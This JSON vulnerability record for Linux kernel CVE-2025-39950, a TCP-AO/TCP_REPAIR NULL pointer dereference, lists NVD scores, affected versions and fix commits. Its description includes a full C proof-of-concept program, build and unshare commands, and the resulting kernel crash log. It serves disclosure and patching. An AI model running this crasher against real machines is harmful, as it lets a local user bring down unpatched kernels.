{
    "CVE-ID": "CVE-2025-39950",
    "NVD": {
        "Descriptions": "In the Linux kernel, the following vulnerability has been resolved:\n\nnet/tcp: Fix a NULL pointer dereference when using TCP-AO with TCP_REPAIR\n\nA NULL pointer dereference can occur in tcp_ao_finish_connect() during a\nconnect() system call on a socket with a TCP-AO key added and TCP_REPAIR\nenabled.\n\nThe function is called with skb being NULL and attempts to dereference it\non tcp_hdr(skb)->seq without a prior skb validation.\n\nFix this by checking if skb is NULL before dereferencing it.\n\nThe commentary is taken from bpf_skops_established(), which is also called\nin the same flow. Unlike the function being patched,\nbpf_skops_established() validates the skb before dereferencing it.\n\nint main(void){\n\tstruct sockaddr_in sockaddr;\n\tstruct tcp_ao_add tcp_ao;\n\tint sk;\n\tint one = 1;\n\n\tmemset(&sockaddr,'\\0',sizeof(sockaddr));\n\tmemset(&tcp_ao,'\\0',sizeof(tcp_ao));\n\n\tsk = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\n\tsockaddr.sin_family = AF_INET;\n\n\tmemcpy(tcp_ao.alg_name,\"cmac(aes128)\",12);\n\tmemcpy(tcp_ao.key,\"ABCDEFGHABCDEFGH\",16);\n\ttcp_ao.keylen = 16;\n\n\tmemcpy(&tcp_ao.addr,&sockaddr,sizeof(sockaddr));\n\n\tsetsockopt(sk, IPPROTO_TCP, TCP_AO_ADD_KEY, &tcp_ao,\n\tsizeof(tcp_ao));\n\tsetsockopt(sk, IPPROTO_TCP, TCP_REPAIR, &one, sizeof(one));\n\n\tsockaddr.sin_family = AF_INET;\n\tsockaddr.sin_port = htobe16(123);\n\n\tinet_aton(\"127.0.0.1\", &sockaddr.sin_addr);\n\n\tconnect(sk,(struct sockaddr *)&sockaddr,sizeof(sockaddr));\n\nreturn 0;\n}\n\n$ gcc tcp-ao-nullptr.c -o tcp-ao-nullptr -Wall\n$ unshare -Urn\n\nBUG: kernel NULL pointer dereference, address: 00000000000000b6\nPGD 1f648d067 P4D 1f648d067 PUD 1982e8067 PMD 0\nOops: Oops: 0000 [#1] SMP NOPTI\nHardware name: VMware, Inc. VMware Virtual Platform/440BX Desktop\nReference Platform, BIOS 6.00 11/12/2020\nRIP: 0010:tcp_ao_finish_connect (net/ipv4/tcp_ao.c:1182)",
        "Cvss2_BaseScore": 0,
        "Cvss3_BaseScore": 5.5,
        "Cvss2_VectorString": "",
        "Cvss3_VectorString": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
        "CPEs": [
            {
                "URI": "cpe:/o:linux:linux_kernel:6.17:rc6",
                "FormattedString": "cpe:2.3:o:linux:linux_kernel:6.17:rc6:*:*:*:*:*:*",
                "VersionStartExcluding": "",
                "VersionStartIncluding": "",
                "VersionEndExcluding": "",
                "VersionEndIncluding": ""
            },
            {
                "URI": "cpe:/o:linux:linux_kernel:6.17:rc5",
                "FormattedString": "cpe:2.3:o:linux:linux_kernel:6.17:rc5:*:*:*:*:*:*",
                "VersionStartExcluding": "",
                "VersionStartIncluding": "",
                "VersionEndExcluding": "",
                "VersionEndIncluding": ""
            },
            {
                "URI": "cpe:/o:linux:linux_kernel:6.17:rc4",
                "FormattedString": "cpe:2.3:o:linux:linux_kernel:6.17:rc4:*:*:*:*:*:*",
                "VersionStartExcluding": "",
                "VersionStartIncluding": "",
                "VersionEndExcluding": "",
                "VersionEndIncluding": ""
            },
            {
                "URI": "cpe:/o:linux:linux_kernel:6.17:rc3",
                "FormattedString": "cpe:2.3:o:linux:linux_kernel:6.17:rc3:*:*:*:*:*:*",
                "VersionStartExcluding": "",
                "VersionStartIncluding": "",
                "VersionEndExcluding": "",
                "VersionEndIncluding": ""
            },
            {
                "URI": "cpe:/o:linux:linux_kernel:6.17:rc2",
                "FormattedString": "cpe:2.3:o:linux:linux_kernel:6.17:rc2:*:*:*:*:*:*",
                "VersionStartExcluding": "",
                "VersionStartIncluding": "",
                "VersionEndExcluding": "",
                "VersionEndIncluding": ""
            },
            {
                "URI": "cpe:/o:linux:linux_kernel:6.17:rc1",
                "FormattedString": "cpe:2.3:o:linux:linux_kernel:6.17:rc1:*:*:*:*:*:*",
                "VersionStartExcluding": "",
                "VersionStartIncluding": "",
                "VersionEndExcluding": "",
                "VersionEndIncluding": ""
            },
            {
                "URI": "cpe:/o:linux:linux_kernel",
                "FormattedString": "cpe:2.3:o:linux:linux_kernel:*:*:*:*:*:*:*:*",
                "VersionStartExcluding": "",
                "VersionStartIncluding": "6.13",
                "VersionEndExcluding": "6.16.9",
                "VersionEndIncluding": ""
            },
            {
                "URI": "cpe:/o:linux:linux_kernel",
                "FormattedString": "cpe:2.3:o:linux:linux_kernel:*:*:*:*:*:*:*:*",
                "VersionStartExcluding": "",
                "VersionStartIncluding": "6.7",
                "VersionEndExcluding": "6.12.49",
                "VersionEndIncluding": ""
            }
        ]
    },
    "Official": {
        "6.12.49": {
            "source": [
                "https://www.kernel.org/pub//linux/kernel/v6.x/ChangeLog-6.12.49"
            ]
        },
        "6.16.9": {
            "source": [
                "https://www.kernel.org/pub//linux/kernel/v6.x/ChangeLog-6.16.9"
            ]
        },
        "6.17": {
            "source": [
                "https://www.kernel.org/pub//linux/kernel/v6.x/ChangeLog-6.17"
            ]
        },
        "commit": {
            "net/tcp: Fix a NULL pointer dereference when using TCP-AO with TCP_REPAIR": [
                {
                    "description": "net/tcp: Fix a NULL pointer dereference when using TCP-AO with TCP_REPAIR",
                    "commit": "5f445eb259906b61a518487a790e11d07d31738c",
                    "source": "https://www.kernel.org/pub//linux/kernel/v6.x/ChangeLog-6.12.49",
                    "version": "6.12.49",
                    "upstream_commit": "2e7bba08923ebc675b1f0e0e0959e68e53047838",
                    "fixed": [
                        {
                            "fixed_commit": "7c2ffaf21bd6",
                            "fixed_commit_source": "https://www.kernel.org/pub//linux/kernel/v6.x/ChangeLog-6.7",
                            "fixed_commit_version": "6.7",
                            "fixed_commit_upstream_commit": []
                        }
                    ]
                },
                {
                    "description": "net/tcp: Fix a NULL pointer dereference when using TCP-AO with TCP_REPAIR",
                    "commit": "993b734d31ab804747ac961b1ee664b023c3b5fa",
                    "source": "https://www.kernel.org/pub//linux/kernel/v6.x/ChangeLog-6.16.9",
                    "version": "6.16.9",
                    "upstream_commit": "2e7bba08923ebc675b1f0e0e0959e68e53047838",
                    "fixed": [
                        {
                            "fixed_commit": "7c2ffaf21bd6",
                            "fixed_commit_source": "https://www.kernel.org/pub//linux/kernel/v6.x/ChangeLog-6.7",
                            "fixed_commit_version": "6.7",
                            "fixed_commit_upstream_commit": []
                        }
                    ]
                },
                {
                    "description": "net/tcp: Fix a NULL pointer dereference when using TCP-AO with TCP_REPAIR",
                    "commit": "2e7bba08923ebc675b1f0e0e0959e68e53047838",
                    "source": "https://www.kernel.org/pub//linux/kernel/v6.x/ChangeLog-6.17",
                    "version": "6.17",
                    "upstream_commit": "",
                    "fixed": [
                        {
                            "fixed_commit": "7c2ffaf21bd6",
                            "fixed_commit_source": "https://www.kernel.org/pub//linux/kernel/v6.x/ChangeLog-6.7",
                            "fixed_commit_version": "6.7",
                            "fixed_commit_upstream_commit": []
                        }
                    ]
                }
            ]
        }
    }
}